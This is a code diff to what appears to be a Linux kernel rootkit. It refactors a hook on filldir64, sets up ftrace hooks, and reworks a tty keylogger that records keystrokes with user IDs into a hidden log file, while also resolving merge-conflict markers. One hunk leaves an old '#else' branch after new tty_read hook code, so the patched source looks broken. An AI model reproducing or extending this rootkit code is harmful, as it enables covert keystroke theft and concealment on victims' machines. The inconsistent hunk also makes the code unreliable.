@@ -802,14 +802,8 @@ static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,
 	return real_filldir64(ctx, name, namlen, offset, ino, d_type);
 }
 
-#define MAXKEY 512
 static LIST_HEAD(keylog_node);
-struct keylog_t {
-	char buf[MAXKEY + 2]; /** newline+'\0' */
-	int offset;
-	uid_t uid;
-	struct list_head list;
-};
+static struct file *filp;
 
 static void __attribute__((unused)) _tty_dump(uid_t uid, pid_t pid, char *buf,
 					      ssize_t len)
@@ -817,35 +811,16 @@ static void __attribute__((unused)) _tty_dump(uid_t uid, pid_t pid, char *buf,
 	prinfo("%s\n", buf);
 }
 
-enum { R_NONE = 0, R_RETURN = 1, R_NEWLINE = 2, R_RANGE = 4 };
-static void _tty_write_log(uid_t uid, char *buf, ssize_t len)
-{
-	static loff_t offset;
-	struct timespec64 ts;
-	long msecs;
-	size_t total;
+void _keylog_cleanup(void) {
+    kv_tty_close(&keylog_node);
+    fs_kernel_close_file(filp);
+    filp = NULL;
+    fs_file_rm(sys_get_ttyfile());
+}
 
-	/**
-     * We use a variable-length array (VLA) because the implementation of kernel_write
-     * forces a conversion to a user pointer. If the variable is heap-allocated, the
-     * pointer may be lost.
-     *
-     * VLA generates a warning since we're not in C99, but it's necessary for our use case.
-     *
-     * We allocate +32 bytes, which is enough to hold timestamp + "uid.%d".
-     */
-	char ttybuf[len + 32];
-
-	spin_lock(&tty_lock);
-
-	ktime_get_boottime_ts64(&ts);
-	msecs = ts.tv_nsec / 1000;
-
-	total = snprintf(ttybuf, sizeof(ttybuf), "[%lld.%06ld] uid.%d %s",
-			 (long long)ts.tv_sec, msecs, uid, buf);
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
-	fs_kernel_write_file(ttyfilp, (const void *)ttybuf, total, &offset);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,12,0)
+static ssize_t  (*real_tty_read)(struct file *, char __user *, size_t, loff_t *);
+static ssize_t m_tty_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
 #else
 	fs_kernel_write_file(ttyfilp, (const char *)ttybuf, total, offset);
 #endif
@@ -1430,26 +1405,15 @@ bool sys_init(void)
 				prinfo("sys_init: ftrace hook %d on %s\n", idx,
 				       ft_hooks[idx].name);
 
-<<<<<<< HEAD
-			/** Init tty log */
-			ttyfilp = fs_kernel_open_file(sys_get_ttyfile());
-			if (!ttyfilp) {
-				prerr("sys_init: Failed loading tty file\n");
-				rc = false;
-			}
+				/** Init tty log */
+				filp = kv_tty_open(&filp, sys_get_ttyfile());
+				if (!filp) {
+					prerr("sys_init: Failed loading tty file\n");
+					rc = false;
+				}
 		}
 	}
 	return rc;
-=======
-            /** Init tty log */
-            if (kv_tty_open(sys_get_ttyfile()) != true) {
-                prerr("sys_init: Failed loading tty file\n");
-                rc = false;
-            }
-        }
-    }
-    return rc;
->>>>>>> 0e7e017 (tty: gets its own source file)
 }
 
 void sys_deinit(void)
